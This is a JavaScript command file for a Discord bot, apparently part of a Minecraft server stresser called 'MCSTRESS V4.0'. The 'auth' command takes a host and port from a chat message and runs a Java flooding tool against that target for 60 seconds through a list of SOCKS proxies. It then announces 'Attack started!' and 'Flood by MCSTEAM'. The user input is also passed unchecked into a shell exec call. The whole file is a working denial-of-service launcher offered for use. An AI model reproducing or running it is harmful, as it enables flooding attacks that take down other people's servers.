const Discord = require("discord.js");

exports.run = async (client, message, args) => {
const host = args.join(" ").split(":").slice(0,1)
const port = message.content.split (":")[1]
const proxy = args.join(" ").slice(2)
var exec = require('child_process').exec
exec(`timeout 60 java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar auth_get_down.jar ${host}:${port} 15000 0 auth socks_proxies.txt`, (error, stdout, stderr) => {
});
console.log('An Attack Launched Discord ID:' +  message.guild.id)
const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('๐ฅ **MCSTRESS V4.0** ๐ฅ')
	.setTimestamp()
	.setDescription("**โบ Method: AuthSmasher ๐ฅ** \n \n โบ Attack started! โ \n โบ For 60 seconds!! ๐ \n โ Flood by MCSTEAM โ")
	.setFooter('ยฉ Developer Mareczekkkk#9738.', client.user.avatarURL)
	.setTimestamp()
	.setThumbnail("")
 message.channel.send(embed);
  }

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['auth'],
  permLevel: 0
}

exports.help = {
  name: 'auth',
  description: 'รzel',
  usage: 'auth'
}